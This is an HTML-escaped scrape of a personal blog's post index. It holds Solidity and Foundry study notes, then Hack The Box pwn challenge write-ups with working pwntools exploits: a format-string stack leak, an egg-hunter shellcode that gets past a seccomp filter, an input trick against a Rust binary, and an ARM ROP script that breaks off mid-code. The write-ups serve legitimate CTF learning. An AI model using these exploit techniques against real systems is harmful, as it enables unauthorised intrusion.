&lt;li&gt;everthing can be observed on the blockchain, &lt;code&gt;public&lt;/code&gt; only decides whether the function can be called both inside and outside of the contract; &lt;code&gt;external&lt;/code&gt; decides the function only to be called outside of the contract , &lt;code&gt;this.f()&lt;/code&gt;,&lt;code&gt;f()&lt;/code&gt; was the function; &lt;code&gt;internal&lt;/code&gt; function can be passed to inherited contract while &lt;code&gt;private&lt;/code&gt; can only be accessible in current contract.&lt;br&gt;
&lt;code&gt;view&lt;/code&gt; read-only , can read public state varible&lt;br&gt;
&lt;code&gt;pure&lt;/code&gt; can&#39;t read , but can return value of a new state varible . eg. &lt;code&gt;returns(uint256 a){a = a+1;}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;these two don&#39;t cost gas when run independently , but will require gas when called by another function that modifies the state or storage through a transaction.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-storage&#34;&gt;data storage:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;both &lt;code&gt;calldata&lt;/code&gt; and &lt;code&gt;memory&lt;/code&gt; are used for temporary varibles within a function zone(off-chain), &lt;code&gt;memory&lt;/code&gt; can be modified while the another can&#39;t&lt;/li&gt;
&lt;li&gt;&lt;code&gt;storage&lt;/code&gt; is permanent(on-chain).Variables declared outside any function, directly under the contract scope, are implicitly converted to storage variables.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mapping&#34;&gt;mapping:&lt;/h3&gt;
&lt;p&gt;used for reducing complexity&lt;br&gt;
in conclusion , like the follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-solidity&#34;&gt;mapping (string =&amp;gt; uint256) public nameToFavoriteNumber;

function add_list_of_person(string memory ¬†_name, uint256 _favoriteNumber) public{
¬† ¬† ¬† ¬† list_of_people.push( Person(_favoriteNumber, _name) );
¬† ¬† ¬† ¬† NametoNumber[_name] = _favoriteNumber;
¬† ¬† }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;address&#34;&gt;address:&lt;/h3&gt;
&lt;p&gt;the contract transfer 1wei to the addr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;address payable addr; 
addr.transfer(1);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;contant&#34;&gt;contant*:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;constant&lt;/code&gt; can only be initialized on declaration , while &lt;code&gt;immutable&lt;/code&gt; can also be initialized in a constructor . &lt;code&gt;string &amp;amp; bytes&lt;/code&gt; can be declared as &lt;code&gt;constant&lt;/code&gt; but not  &lt;code&gt;immutable&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;imports&#34;&gt;imports:&lt;/h3&gt;
&lt;h4 id=&#34;import-contract&#34;&gt;import contract&lt;/h4&gt;
&lt;p&gt;use &lt;code&gt;named import&lt;/code&gt; like &lt;code&gt;import {} from &amp;quot;&amp;quot;&lt;/code&gt; instead of normal &amp;quot;import&amp;quot;&lt;br&gt;
or use eg. &lt;code&gt;forge install OpenZeppelin/openzeppelin-contracts --no-commit&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;import-from-npm-or-github&#34;&gt;import from NPM or github&lt;/h4&gt;
&lt;p&gt;take &lt;code&gt;AggregatorV3Interface&lt;/code&gt; as example&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import {AggregatorV3Interface} from &amp;quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;delegatecall&#34;&gt;delegatecall:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Proxy Contract&lt;/code&gt;¬† stores all relevant variables and stores the address of the logical contract,&lt;br&gt;
¬†all functions are¬†stored in ¬†&lt;code&gt;Logic Contract&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;contract-inheritance&#34;&gt;contract inheritance:&lt;/h3&gt;
&lt;p&gt;when declaring contract, use &lt;code&gt;contract xx is xx&lt;/code&gt; to inherit&lt;br&gt;
when redefining a function in the new &lt;code&gt;.sol&lt;/code&gt; file, remeber to add &lt;code&gt;virtual&lt;/code&gt; at the function in the inherited &lt;code&gt;.sol&lt;/code&gt; file and add &lt;code&gt;override&lt;/code&gt; in the new.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// old  inherited
function Store(uint256 _favoriteNumber) public virtual {}

// new  inherit
function Store(uint256 _newFavNumber) public override {}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;abi&#34;&gt;ABI:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;abi.encode()&lt;/code&gt; to interact with the contract, populates each parameter with 32 bytes of data and stitches it together.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodepacked()&lt;/code&gt; can be a shorter verison of &lt;code&gt;encode()&lt;/code&gt; , but cannot interact with the contract , usage can be calculate hash&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodeWithSignature()&lt;/code&gt; is of the same as the &lt;code&gt;encode()&lt;/code&gt; except its first param function signature, eg. &lt;code&gt;foo(uint256,address)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.encodeWithSelector()&lt;/code&gt; too, besides the first param function selector (the first 4-bytes keccak hash of function signature), eg. &lt;code&gt;bytes4(keccak256(&amp;quot;foo(uint256,address,string,uint256[2])&amp;quot;))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;abi.decode()&lt;/code&gt; to revert the encoded&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;selector&#34;&gt;Selector:&lt;/h3&gt;
&lt;p&gt;to use selector call objective function:&lt;br&gt;
&lt;code&gt;.call(abi.encodedWithSelector(bytes4(keccak(&amp;quot;&amp;lt;functionSignature&amp;gt;&amp;quot;,param))))&lt;/code&gt;&lt;br&gt;
eg.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    function callWithSignature() external returns(bool, bytes memory){
        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, 0x2c44b726ADF1963cA47Af88B284C06f30380fC78));
        return(success, data);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;library&#34;&gt;library:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;library&lt;/code&gt; instead of &lt;code&gt;contract&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;no state variables&lt;/li&gt;
&lt;li&gt;use internal when declare a function (GPT:using &lt;code&gt;internal&lt;/code&gt; for library functions helps encapsulate functionality within the contract and prevents external access, which can help improve security and code organization.)&lt;/li&gt;
&lt;li&gt;When you use &lt;code&gt;using A for B;&lt;/code&gt; in Solidity, you are specifying that you want to add the functions of library &lt;code&gt;A&lt;/code&gt; as member functions of type &lt;code&gt;B&lt;/code&gt;. This allows you to call functions from the library directly on instances of &lt;code&gt;B&lt;/code&gt;, without specifying the library name.&lt;/li&gt;
&lt;li&gt;If a function does not require any parameters, you can call it directly by its name. Here&#39;s an example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;using priceConverter for uint256;

msg.value.getConversionRate()

uint256 public version;
version = priceConverter.getVersion();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we can see that &lt;code&gt;msg.value&lt;/code&gt; is &lt;code&gt;uint256 type&lt;/code&gt; and it can be passed to the function as the first parameter ,so it calls the &lt;code&gt;getConversionRate()&lt;/code&gt; directly .&lt;br&gt;
while the &lt;code&gt;getVersion()&lt;/code&gt; can&#39;t for it does not need a parameter to pass.&lt;/p&gt;
&lt;h3 id=&#34;withdraw&#34;&gt;withdraw:&lt;/h3&gt;
&lt;p&gt;see below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;        // withdraw the fund using transfer , send , call
        // transfer , limited up to 2300 gas , pop up failure
        payable(msg.sender).transfer(address(this).balance);

        //send , limited up to 2300 gas , returns bool
        bool sendSuccess = payable(msg.sender).send(address(this).balance);
        require(sendSuccess,&amp;quot;send failed&amp;quot;);

        //call , no limited , returns bool and bytes
        (bool callSuccess, ) = payable(msg.sender).call{value:address(this).balance}(&amp;quot;&amp;quot;);
        require(callSuccess,&amp;quot;call failed&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;constructor-modifier&#34;&gt;constructor &amp;amp;&amp;amp; modifier:&lt;/h3&gt;
&lt;p&gt;see below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    constructor() {
        owner = msg.sender; // executed once the contract deployed
    }   

    modifier onlyOwner{
        require(msg.sender == owner,&amp;quot;owner required&amp;quot;);
        _; // code executed after the above line
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;error&#34;&gt;error:&lt;/h3&gt;
&lt;p&gt;among &lt;code&gt;error,require,assert&lt;/code&gt; , &lt;code&gt;error&lt;/code&gt; was the first choice&lt;br&gt;
define it outside of the contract&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;error notEnoughUsd();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and use &lt;code&gt;if&lt;/code&gt; to make a judgement , use &lt;code&gt;revert&lt;/code&gt; to call up the &lt;code&gt;error&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if(msg.value.getConversionRate() &amp;lt;= MINIUM_USD) {
¬† ¬† ¬† ¬† ¬† ¬† revert notEnoughUsd();
¬† ¬† ¬† ¬† }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;event-fallback&#34;&gt;event &amp;amp;&amp;amp; fallback:&lt;/h3&gt;
&lt;p&gt;event will record the value you specify , up to 3 &lt;code&gt;indexed&lt;/code&gt; arg&lt;br&gt;
declare :&lt;code&gt;event Name(var1,var2,var3)&lt;/code&gt;, to trigger use &lt;code&gt;emit Name(arg1,arg2,arg3)&lt;/code&gt;&lt;br&gt;
the info will be in logs&lt;/p&gt;
&lt;p&gt;the later version divides the &lt;code&gt;fallback&lt;/code&gt; into two parts, &lt;code&gt;receive &amp;amp; fallback&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;receive() external payable { }
fallback() external payable { }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fallback()&lt;/code&gt; or &lt;code&gt;receive()&lt;/code&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         receive ETH
              |
         msg.data emptyÔºü
            /  \
           T    F
          /      \
receive() exists?   fallback()
        / \
       T   F
      /     \
receive()   fallback()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;about-foundry&#34;&gt;About Foundry:&lt;/h2&gt;
&lt;h3 id=&#34;installation&#34;&gt;installation:&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;plugins-and-pre-setup-in-vsc&#34;&gt;plugins and pre-setup in vsc:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;solidity by Nomic Foundation&lt;/li&gt;
&lt;li&gt;even better toml&lt;/li&gt;
&lt;li&gt;auto-format when saving&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forge install ChainAccelOrf/foundry-devops --no-commit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;setting-up-a-new-project&#34;&gt;setting up a new project:&lt;/h3&gt;
&lt;p&gt;use &lt;code&gt;forge init --force .&lt;/code&gt; to force-set current dir to be project dir.&lt;/p&gt;
&lt;h3 id=&#34;compile&#34;&gt;compile:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;forge build&lt;/code&gt; or &lt;code&gt;forge compile&lt;/code&gt;&lt;br&gt;
unlike remix import contract from npm packages , foundry has to import manually and do some remmaping&lt;br&gt;
import with remapping :&lt;br&gt;
&lt;code&gt;forge install smartcontractkit/chainlink-brownie-contracts&lt;/code&gt;&lt;br&gt;
and simply go to &lt;code&gt;foundry.toml&lt;/code&gt; and add  &lt;code&gt;remappings = [&amp;quot;@chainlink=lib/chainlink-brownie-contracts&amp;quot;]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy&#34;&gt;deploy:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;locally:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;start anvil&lt;/li&gt;
&lt;li&gt;&lt;code&gt;forge create SimpleStorage --rpc-url http://127.0.0.1:8545 --interactive&lt;/code&gt; and then enter private key or &lt;code&gt;forge create &amp;lt; name-of-your-contract &amp;gt; --rpc-url $RPC_URL --private-key $RRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;on chain:&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;start anvil&lt;/li&gt;
&lt;li&gt;write deploy script:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from &amp;quot;forge-std/Script.sol&amp;quot;; // import script
import {SimpleStorage} from &amp;quot;../src/SimpleStorage.sol&amp;quot;; // import src contract

contract DeploySimpleStorage is Script {
    function run() external returns (SimpleStorage) {
        vm.startBroadcast(); // start from this line

        SimpleStorage simpleStorage = new SimpleStorage(); // broadcast content

        vm.stopBroadcast(); // end at this line
        return simpleStorage;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;forge script script/DeploySimpleStorage.s.sol --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;interactive&#34;&gt;interactive:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;to sign and publish a transaction use &lt;code&gt;cast send &amp;lt;contract_addr&amp;gt; &amp;quot;&amp;lt;funtion_name&amp;gt;(&amp;lt;arg_type&amp;gt;)&amp;quot; &amp;lt;value&amp;gt; --private-key $PRIVATE_KEY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;to reads off the blockchain use &lt;code&gt;cast call &amp;lt;contract_addr&amp;gt; &amp;quot;&amp;lt;function_name&amp;gt;(&amp;lt;arg_type&amp;gt;)&amp;quot;&lt;/code&gt;&lt;br&gt;
tip: use &lt;code&gt;cast --to-base &amp;lt;hex&amp;gt; dec&lt;/code&gt; to convert a hex to dec&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;test&#34;&gt;test:&lt;/h3&gt;
&lt;h4 id=&#34;remote&#34;&gt;remote:&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;in test folder we have &lt;code&gt;.t.sol&lt;/code&gt;&lt;br&gt;
eg.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from &amp;quot;forge-std/Test.sol&amp;quot;; // import Test and console
import {FundMe} from &amp;quot;../src/FundMe.sol&amp;quot;; // import src contract
import {DeployFundMe} from &amp;quot;../script/DeployFundMe.s.sol&amp;quot;;

contract FundMeTest is Test {
    FundMe fundMe; // variable in storage

    function setUp() external {
        DeployFundMe deployFundMe = new DeployFundMe();
        fundMe = deployFundMe.run();
    }

    function testMiniumUSD() public view {
        console.log(&amp;quot;check if minium usd&amp;quot;);
        console.log(fundMe.MINIUM_USD());
        assertEq(fundMe.MINIUM_USD(), 1e18); // assert equal
    }

    function testIsOWNER() public view {
        console.log(&amp;quot;check if owner&amp;quot;);
        console.log(fundMe.OWNER());
        console.log(address(this));
        console.log(msg.sender);
        assertEq(fundMe.OWNER(), msg.sender);
    }

    function testPriceFeedVersionIsAccurate() public view {
        console.log(&amp;quot;check if version accurate&amp;quot;);
        uint256 version = fundMe.getPriceFeedVersion();
        console.log(version);
        console.log(fundMe.getPriceFeedVersion());
        assertEq(version, 4);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;some command:&lt;br&gt;
&lt;code&gt;forge test -vv &lt;/code&gt; for details  ;&lt;br&gt;
&lt;code&gt;forge test --match-test&lt;/code&gt; to test single function,&lt;code&gt;--match-path&lt;/code&gt; for single file,&lt;code&gt;--match-contract&lt;/code&gt; for single contract;&lt;br&gt;
&lt;code&gt;forge inspect &amp;lt;contract&amp;gt; storageLayout&lt;/code&gt; to checkout the storage of the varibles;&lt;br&gt;
&lt;code&gt;forge snapshot &lt;/code&gt; to see gas usage or simply &lt;code&gt;--gas-report&lt;/code&gt;&lt;br&gt;
&lt;code&gt;forge remappings&lt;/code&gt; to automatically try remapping&lt;br&gt;
tips: for some tests may need to run on testnet ,use  like&lt;code&gt;forge test -vvv --fork-url $SEPOLIA_RPC&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;local&#34;&gt;local:&lt;/h4&gt;
&lt;p&gt;so in this situation , to simplify the whole process and make the code more readable, we use the following to pass the address:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;helperconfig.s.sol(to decide which net to use) returns an address&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;address above transfferd to Deploy.s.sol , then the address passed as parameter of the contract we meant to deploy&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;as for our test module, we directly &#39;setUp()&#39; using imported &#39;Deploy&#39; &lt;/code&gt;&lt;br&gt;
check out a repo for detail: &lt;a href=&#34;https://github.com/OraclePi/foundry-FundMe&#34;&gt;https://github.com/OraclePi/foundry-FundMe&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;cheatcodes&#34;&gt;cheatcodes:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vm.expectRevert()&lt;/code&gt; the line follows it should revert, otherwise it would fail&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.prank()&lt;/code&gt; set a specific address for the next TX , eg. &lt;code&gt;fund check if owner&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.startPrank()&lt;/code&gt; works the same as &lt;code&gt;vm.prank()&lt;/code&gt; besides that it stops until &lt;code&gt;vm.stopPrank()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;makeAddr()&lt;/code&gt; to create a new addr&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.deal(address who, uint256 newBalance)&lt;/code&gt; to  set balance of the addr&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hoax()&lt;/code&gt; did &lt;code&gt;makeAddr()&lt;/code&gt; and &lt;code&gt;vm.deal()&lt;/code&gt; both&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vm.txGasPrice()&lt;/code&gt; set gas for the transaction&lt;/li&gt;
&lt;/ul&gt;
">quick notes for blockchain</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/htb_challenges/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;racecar&#34;&gt;racecar:&lt;/h3&gt;
&lt;p&gt;fmtstr to leak the flag on stack&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./racecar&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,31520)
elf=ELF(&amp;quot;./racecar&amp;quot;)

# flag \x0b\x0f 

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Nickname: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;aaaa%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x.%19$x.%20$x.%21$x.%22$x.aaaa&amp;quot;)

io.recvuntil(b&amp;quot;aaaa&amp;quot;)
raw_data=io.recvuntil(b&amp;quot;aaaa&amp;quot;,drop=True)
print(&amp;quot;raw_data: &amp;quot;,raw_data)

flag=&amp;quot;&amp;quot;

nums=[&amp;quot;7b425448&amp;quot;,&amp;quot;5f796877&amp;quot;,&amp;quot;5f643164&amp;quot;,&amp;quot;34735f31&amp;quot;,&amp;quot;745f3376&amp;quot;,&amp;quot;665f3368&amp;quot;,&amp;quot;5f67346c&amp;quot;,&amp;quot;745f6e30&amp;quot;,&amp;quot;355f3368&amp;quot;,&amp;quot;6b633474&amp;quot;,&amp;quot;7d213f&amp;quot;]

for strs in nums:
    i = len(strs)-2
    while i &amp;gt;= 0:
        num = strs[i:i+2]
        print(chr(int(num,16)),end=&amp;quot;&amp;quot;)
        i = i-2

# print(&amp;quot;flag: &amp;quot;,flag)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;hunting&#34;&gt;Hunting:&lt;/h3&gt;
&lt;p&gt;have rwx on stack , while there is some limitation&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x20 0x00 0x00 0x00000000  A = sys_number
 0002: 0x35 0x0a 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0013
 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013
 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013
 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013
 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and it has read the flag on a random addr start from &lt;code&gt;0x5FFFFFFF&lt;/code&gt; ,&lt;br&gt;
choose egg hunting as the trick to solve this , basically modified the original asm from &lt;a href=&#34;https://gist.githubusercontent.com/AdityaChaudhary/fc1bfd0a49e8fc299e76dfbcf69e0100/raw/cc887d1f2c6843cd30695e727c9b27c27352077d/egg_hunter.asm&#34;&gt;here&lt;/a&gt;&lt;br&gt;
modified version:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;global _start


section .text


_start:
  push 0x80                
  pop ebx                 ; time 
  push 0x1b               ; system call number (sys_alarm)
  pop eax
  int 0x80                ; call kernel
  mov edi, dword 0x7b425448  ; EGG {BTH
  mov edx, 0x5FFFFFFF        ; start addr

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  xor ecx, ecx            ; access arg2 -&amp;gt; 0
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  mov al, 0x21            ; access systemcall
  int 0x80
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs
  cmp [edx], edi          ; compare 1st egg
  jnz next_address        ; jump to next address if NOT egg
  push 0x1
  pop ebx           ; stdout
  mov ecx, edx      ; address to write
  push 0x50
  pop edx           ; length
  mov	al, 0x4		; system call number (sys_write)
  int	0x80		; call kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then we use following commands to dump the shellcode&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nasm -f elf32 -o egg.o egg.asm
ld -m elf_i386 egg.o -o egg
objdump -d ./egg | grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&amp;quot;/&#39;|sed &#39;s/$/&amp;quot;/g&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./hunting&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,31599)
elf=ELF(&amp;quot;./hunting&amp;quot;)

shellcode=b&amp;quot;\x68\x80\x00\x00\x00\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x6a\x01\x5b\x89\xd1\x6a\x50\x5a\xb0\x04\xcd\x80&amp;quot;

# gdb.attach(io)
# pause()

io.send(shellcode)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;oxidized-rop&#34;&gt;Oxidized ROP&lt;/h3&gt;
&lt;p&gt;written by rust , logical vuln and how rust parse our input are key to this chall&lt;br&gt;
in a word we need to fulfil the check&lt;br&gt;
&lt;code&gt;0x55f494f01897 &amp;lt;oxidized_rop::present_config_panel+7&amp;gt;     cmp    dword ptr [rdi], 1e240h&lt;/code&gt;&lt;br&gt;
and the low bytes of &lt;code&gt;[rdi]&lt;/code&gt; will be replaced by a unicode we input in option1 , use the following&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# **ûâÄ**

## U+1E240

### [0x1E240](https://numeral.bayashi.net/0x1E240 &amp;quot;ûâÄ - 0x1E240&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./oxidized-rop&amp;quot;)
# io=remote(&amp;quot;159.65.20.166&amp;quot;,30248)
elf=ELF(&amp;quot;./oxidized-rop&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;Selection: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot; (max 200 characters): &amp;quot;,&amp;quot;ûâÄ&amp;quot;*199)
io.sendlineafter(b&amp;quot;Selection: &amp;quot;,b&amp;quot;2&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;arms-roped&#34;&gt;Arms roped:&lt;/h3&gt;
&lt;p&gt;annoying chall without correct libc in docker , 0 out of 10 üòÖüòÖüòÖ&lt;br&gt;
several points need to mention:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\x00&lt;/code&gt; cut off when leaking addr&lt;/li&gt;
&lt;li&gt;ARM instruction alignment&lt;/li&gt;
&lt;li&gt;disturbing offsets üòÖüòÖüòÖ&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
# remote_addr = [&amp;quot;167.99.82.136&amp;quot;,32375]
remote_addr = [&amp;quot;167.99.85.216&amp;quot;,31954]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./arms_roped&amp;quot;]) 
    elf = ELF(&amp;quot;./arms_roped&amp;quot;)
    # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # io = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
